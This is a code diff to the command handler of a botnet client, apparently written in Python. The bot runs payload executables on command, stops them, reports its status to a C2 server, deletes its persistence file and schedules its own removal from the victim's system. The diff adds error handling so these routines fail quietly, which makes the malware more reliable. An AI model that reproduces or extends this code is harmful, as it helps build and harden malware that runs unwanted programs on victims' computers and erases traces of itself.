@@ -52,17 +52,22 @@ class CommandHandler:
         if (not isProgramSpecified):
             return
         
-        payload_name = f"payloads/{id}.exe"
-        self.exeHandler.add_program(subprocess.Popen(payload_name, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP), name=id)
-
+        try:
+            payload_name = f"payloads/{id}.exe"
+            self.exeHandler.add_program(subprocess.Popen(payload_name, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP), name=id)
+        except Exception as e:
+            print(f"Error executing payload {e}")
 
     # Stop any running payloads
     def __stopPayload(self, id: str, params: list):
         stopAllPrograms = (id == None)
-        if (stopAllPrograms):
-            self.exeHandler.stop_all_programs()
-        else:
-            self.exeHandler.stop_program(name=id)
+        try: 
+            if (stopAllPrograms):
+                self.exeHandler.stop_all_programs()
+            else:
+                self.exeHandler.stop_program(name=id)
+        except Exception as e:
+            print(f"Error stopping payload {e}")
 
     # Announce bot status to C2 server
     def __announce_status(self, id: str, params: list):
@@ -93,8 +98,10 @@ class CommandHandler:
     
     # Remove the presistant data file from the bot's system
     def __cleanupPresistantData(self):
-        os.remove("Botnet_precistantData.txt")
-
+        try:
+            os.remove("Botnet_precistantData.txt")
+        except Exception as e:
+            pass
 
     # Delete bot executable from victims system
     def __schedule_self_delete(self):
